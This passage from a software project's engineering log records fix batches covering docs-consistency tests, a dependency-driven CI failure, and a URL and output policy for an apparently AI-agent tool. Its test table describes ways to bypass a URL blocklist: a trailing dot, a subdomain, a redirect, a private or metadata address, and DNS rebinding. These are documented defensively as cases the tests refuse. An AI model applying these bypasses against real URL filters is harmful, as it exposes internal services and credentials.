whose `tool_calls` is `[]`. **The one thing a pinned assistant row carries in production is the
one thing that fixture leaves empty**, because `pin` is itself a tool. Removing the re-inclusion
entirely *was* pinned; what had no test was the interaction between the two boundaries — and
neither M4 nor M9 mentions the other.

---

## §20 — the fourth fix batch: the docs-drift tier (2026-08-17)

Seventeen issues. Almost all of it is prose, and the one sentence that explains the whole
batch is unit 16's: **the claims that drift are the ones somebody had to count by hand.**

So this batch corrects the current round *and* mechanises four of the counting habits that
produced it. `TECHNICAL_DEBT.md` item 7 pre-registered exactly that trigger — "BUILT markers
and tree entries are still by hand… **if those two start drifting the same way, extend this
file's check**" — and both had drifted.

Suite 1605 → **1613**.

### Standing: moving a dependency out of `requirements.txt` can break a test that never uses it

**This batch broke CI and the local suite stayed green.** Moving `markitdown` to an optional
extra was the point of #144's third item — its only consumer is `file_ops._read_rich`, behind
`read`, which is globally denied and cannot be re-enabled at runtime, and the import is lazy.
Nothing in production can reach it.

But `tests/test_file_ops.py` does `patch("markitdown.MarkItDown", ...)`, and **`mock.patch`
with a string target IMPORTS the module to resolve it.** So the test needed the package
installed for a reason unrelated to anything it asserts: it substitutes a `MagicMock` and never
touches the real library. On a developer machine markitdown was still installed from before, so
the suite passed; on a runner doing a fresh `pip install -r requirements.txt` it failed with
`ModuleNotFoundError`, and it was the ONLY failure — the job reported nothing but `exit code 1`.

Two rules out of it:

1. **When a package leaves `requirements.txt`, grep the suite for its name — including string
   patch targets**, which no import-graph check will find.
2. **A green local suite does not mean a green fresh install.** Reproduced with
   `docker run python:3.11-slim` over a `git archive` of HEAD: pre-fix **1 failed, exit 1**;
   post-fix **1611 passed, exit 0**. That container is also the only way the eleven tests which
   `skipif` on Windows (symlinks, SIGALRM) get run at all — all eleven pass on Linux.

The fix is a stub in the root `conftest.py` beside the six SDK fakes, which is what that
mechanism exists for. Its `convert` RAISES rather than returning something plausible, so
anything reaching it unpatched fails loudly instead of receiving a fake conversion. `_read_rich`
also now turns the missing extra into a message naming `pip install -e ".[documents]"`, since a
bare `ModuleNotFoundError` names a package the user never asked for.

### The four new assertions in `test_docs_consistency.py`

| If a document drifts like this… | …this fails |
|---|---|
| A per-file count in ARCHITECTURE's tree goes wrong | `test_the_tree_states_a_correct_count_for_every_collected_test_file` |
| A test file lands with no tree entry | the same test — **strict** in both directions |
| A tree entry names a file that was renamed away | `test_no_tree_entry_names_a_test_file_that_does_not_exist` |
| A ROADMAP_v2 index entry loses its status marker | `test_every_roadmap_v2_index_entry_carries_a_status_marker` |
| A registered tool never reaches README's approval table | `test_every_registered_tool_appears_in_readmes_approval_table` |
| ARCHITECTURE's registry counts go stale | `test_architecture_states_the_real_registry_counts` |

Seven mutations, all RED on the check named for them. The rule for what belongs in that file
is unchanged and is now written into its docstring: **a claim earns a check by having already
drifted, and only if the truth is something the suite can compute.** Every one of them
compares a document against a live value — the collected session, the registry, the
permission dataclasses — never against another hand-written number.

### Standing: two of the seven mutations survived the first run, for two different reasons

Both are the vacuity class this file exists for, and both generalise:

1. **A narrowed invocation makes a session-dependent check SKIP, and a skip reads as a
   survivor.** The driver ran `pytest tests/test_docs_consistency.py` — which *is* narrowed,
   so the two checks that need `request.session.items` never executed. TECHNICAL_DEBT 6's own
   note ("one class of vacuity a revert check cannot catch is a test that SKIPS") arriving
   inside a mutation driver. **Mutation-check a session-dependent test against the full
   suite.**
2. **A character window is not a structure.** The README check read
   `readme[start:start + 2000]`, which swallowed the explanatory paragraphs below the table —
   and those name `write_project_doc` in backticks too, so deleting it from the table left
   the check green. It now walks the table rows and stops at the first line that is not one.

### Standing: PowerShell's `Get-Content`/`Set-Content` round-trip corrupts UTF-8

Updating the aggregate count with `(Get-Content $f -Raw) -replace ... | Set-Content -Encoding utf8`
**double-encoded three documents** — PS 5.1 reads a BOM-less UTF-8 file as cp1252, so every
`—` and `§` became mojibake, and a BOM was added. Reversible (`decode utf-8 → encode cp1252`)
because the damage is uniform across a whole-file rewrite, but the lesson is the rule:
**do file rewriting in Python with explicit `encoding="utf-8"`, or with the editor.** This is
the same family as the `2>&1` NativeCommandError note — PowerShell is fine for git and
process control and is a hazard for text.

### The corrections, all re-measured rather than copied

The issue bodies predate batches 2 and 3, and every figure in them had moved:

| | audit said | measured now |
|---|---|---|
| Wrong per-file counts | 11 | **18** (`test_math_tools` 14 → 123 after #52's battery; `test_orchestrator` 11 → 23 after batch 3) |
| Test files with no tree entry | 8 | **7** |
| Test files | 54 / 58 | **65** |
| Registered / advertised tools | 16 / 12 | **22 / 16**, 13 callable headless |
| Tests failing without `providers.json` | 11 across 3 files | **12 across 4** |
| `read_project_doc`'s reach | "the project's own README" | **40 files, ~1.1 MB, depths 0-3** |

### Two behaviour changes

| Change | …this fails if reverted | Why |
|---|---|---|
| Anthropic's streaming branch honours `supports_stream_usage` (#40) | `test_stream_anthropic_d21_raises_on_zero_usage_when_flag_true` | The default provider was outside D21, with the `getattr(..., 0)` default AGENTS.md forbids by name. An SDK field rename would have zeroed the budget silently |
| …and honours it rather than always raising | `test_stream_anthropic_honours_the_flag_rather_than_always_raising` | The flag now means one thing on all three providers. Without this second test, that claim has nothing behind it |
| `config.APICredentials` deleted (#23) | nothing — it was dead | Its comment told the reader to store an env var's *name* as their API key, which is not what `credentials.save_credentials` does with the value |

### `CLAUDE.md` is now `AGENTS.md`

`CLAUDE.md` and `QWEN.md` are pointers to it. QWEN.md was a second,
independently-maintained context file with five claims false about the present code, and its
staleness warning lived in the file its reader does not open. One copy, several filenames —
the same argument this document makes about every other hand-maintained duplicate.

**Consequence:** Claude Code auto-injects `CLAUDE.md`, so it now injects a pointer rather than
84 KB. The context is an explicit read instead of an automatic one.

---

## §21 — the fifth fix batch: the URL and output policy boundary (2026-08-18)

Eight issues. Five of them are one question asked at three depths — **may this URL be
requested** — and they are one batch because fixing any of them alone rewrites the others.
#54's own report says so: *"the two fixes want the same manual-redirect loop, so they are
cheaper done together."*

| Change | Issue | Files |
|---|---|---|
| One normaliser, suffix matching | #48 | `safety/policy_enforcement.py` |
| `is_url_permitted` — scheme + domain + non-public address | #54 | `safety/policy_enforcement.py`, `tools/builtin/web_search.py` |
| Manual redirect loop, checked before every hop; report the URL that answered | #53 | `tools/builtin/fetch_url.py` |
| Scan every key of a tool result, not an allowlist | #47 | `safety/policy_enforcement.py`, `mcp_client/client.py` |
| Redact in the log formatter | #132 | `logging_setup.py`, `tools/registry.py` |
| `providers.json` and the trust store created 0600 | #19 | `credentials.py`, `core/workspace_trust.py` |
| Anthropic capabilities read as attributes | #35 | `core/client.py` |
| Contain every UI-thread persistence call | #104 | `tui/app.py` |

Suite 1613 → **1667**.

### What breaks these

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| Drop the trailing-dot strip in `_hostname` | `test_a_trailing_dot_does_not_bypass_either_branch` | `evil.com.` is a legal FQDN naming the same host, and it defeated *both* branches |
| Match exactly instead of by suffix | `test_a_subdomain_of_a_blocked_domain_is_blocked` | One prepended label leaves the blocklist |
| Match by bare string suffix instead of by label | `test_the_suffix_match_is_label_wise_not_string_wise` | `notevil.com` starts being blocked — over-blocking a domain nobody listed |
| Stop stripping the port on the bare-domain branch | `test_a_port_does_not_bypass_the_bare_domain_branch` | The two branches disagree again, which is what made #48 an inconsistency rather than a limitation |
| Remove the `is_global` check | `test_non_public_addresses_are_refused` (8 cases) | The metadata endpoint returns role credentials into model context and the persisted `MessageLog` |
| Check only the first resolved address, or require all of them | `test_any_non_public_answer_refuses_not_just_the_first` | A name answering with one public and one private address is the rebinding shape; both readings let it through |
| Pass `resolve=True` from `web_search` | `test_filtering_results_issues_no_dns` | A DNS lookup per search hit, ten hits a call, inside ten passes — nothing *fails*, it just gets slow |
| Check only the first hop | `test_a_redirect_to_a_blocked_domain_is_refused` + the real-httpx twin | One 302 walks past the control, and the blocked host has already served its body |
| Report `parsed.url` instead of the final URL | `test_the_reported_url_is_the_one_that_ANSWERED` + its real-httpx twin | Provenance: a redirect silently rewrites what a claim is grounded in, and `output_writer` builds `sources/` from it |
| Reinstate the `_SCANNED_KEYS` allowlist | 3 tests in `TestEveryKeyIsScanned` | `results` is not `result`; the two tools whose content is entirely third-party text go unredacted |
| Redact the result but not the log record | `test_a_secret_in_a_TRACEBACK_does_not_reach_the_file` | Same string, two sinks, one redacted |
| Remove `tui/app.py`'s replay containment | `test_a_replay_failure_while_resuming_does_not_kill_the_tui` | The app dies having just cleared the screen and written "Resumed thread `<uuid>`." |
| Move the memory load below the transcript reset | `test_a_failure_opening_the_thread_leaves_the_session_on_the_old_one` | Ordering *is* the fix there, not the `try` block |
| Leave `_busy` set when a turn fails to start | `test_a_storage_failure_starting_a_turn_does_not_kill_the_tui` | The shell refuses every later turn with "Still working" for a turn that never started |
| Write `providers.json` with a bare `open()` | `test_a_permissive_umask_does_not_widen_it` — **on POSIX only** | See the standing note below |

### Standing: a skip reads as a surviving mutation, and this batch proved it

§20 recorded this one batch ago — *"a narrowed invocation makes a session-dependent check
SKIP, and a skip reads as a survivor"* — and #19 is the same class from the other direction.
Its four mode assertions `skipif` off POSIX, because POSIX mode bits do not exist on Windows
and `os.open`'s mode only sets the read-only flag there.

**On the development machine, mutating `0o600` to `0o644` left the suite green.** The
mutation was only measurable in `python:3.11-slim`, where all four run:

```
control                                    9 passed
_SECRET_FILE_MODE = 0o644                  2 failed   (420 != 384)
bare open(path, "w")                       2 failed   (438 != 384)
trust store bare open()                    1 failed
```

**The rule: a guard whose test can skip is not verified until the mutation runs where the
test does.** The container is part of this batch's verification, not a formality.

### Standing: the mutation harness is itself a place a mutation can silently not apply

Two mutations in this batch reported a result that was not the result.

1. **A `\n` needle against a CRLF file matches nothing**, and a no-op edit reads as a
   survivor. `tui/app.py` is CRLF while most of the tree is LF. The harness now normalises
   the needle to the file's own line ending and asserts the bytes changed before running
   anything.
2. **A syntactically invalid mutation reports RED for the wrong reason.** Replacing `try:`
   with `if True:` left a dangling `except`, so pytest reported a *collection error* — and
   "1 error" in a summary reads like a kill. The replay guard is now mutated by removing the
   whole block, with `py_compile` run first, so a red is a real failure.

Both are instances of the rule this document already states: **a test that fails for the
wrong reason is indistinguishable from one that works** — arriving, twice, inside the tool
built to enforce it.

### Recorded, not closed: three limitations the tests cannot see

- **DNS rebinding.** `is_url_permitted` resolves, then httpx resolves again independently.
  Closing it means connecting to the pinned IP with the host in a `Host:` header, which on
  HTTPS fights SNI and certificate verification — a subtly wrong implementation there is a
  worse hole than this one. Stated in the function's docstring.
- **`os.open`-with-mode versus `open()`-then-`chmod`.** Mutating the fix to the second form
  stays **green**, and it should: the file ends up 0600 either way. What `os.open` buys is
  the absence of a window in which the key is on disk world-readable, and no offline test can
  observe a race. Measured and recorded so the next reader does not delete the `os.open` as
  ceremony.
- **A pre-existing 0644 file keeps its mode** through `O_TRUNC`. Repairing one is a
  migration; the scope here is "new writes are safe". Pinned by a test that says so.

### Why eight green tests could not see #35

`test_client_effort.py` built its doubles as nested dicts — `capabilities={"effort":
{"high": {"supported": True}}}` — the same wrong shape `core/client.py` assumed. Production
and the double agreed with each other and both disagreed with the SDK, so the capability
query **could never succeed in production and could never fail in the suite**.

Fixing only the code would have left that intact. The doubles are rebuilt attribute-shaped,
and `test_sdk_conformance.py` gained a test driving `_effort_levels` against capability
objects built from the **real pinned types** — the test the dict-shaped doubles could not be.
The general rule, which this project already states about `FakeStorage`: **anything a test
doubles, something has to check against the real thing.**

### The two strict xfails are gone

Both said, in their own reasons, that fixing the issue would turn them XPASS and that the
marker should then be deleted. Both did.

- `test_a_redirect_to_a_blocked_domain_is_refused` (#53) — now a real test, joined by a twin
  driving **real httpx** through a `MockTransport`. The fake httpx is this project's model of
  httpx, and #53 exists because the old code's model of httpx was wrong; a fake written to
  match the new code cannot be evidence that the new code matches httpx.
- `test_the_anthropic_capability_read_matches_the_pinned_types` (#35) — **inverted** rather
  than deleted. It now asserts the chain the fixed code relies on.

`tests/conftest.py`'s `http` driver gained `redirect()` and lost `redirected()`: the old
helper queued the answer a *followed* redirect produces, which is a shape `fetch_url` no
longer receives. A fixture that can only express the old shape quietly stops testing the code
under test. The root `conftest.py`'s fake `_Response` gained `is_redirect` and `next_request`,
both mirroring real httpx's documented rule rather than a rule invented here.
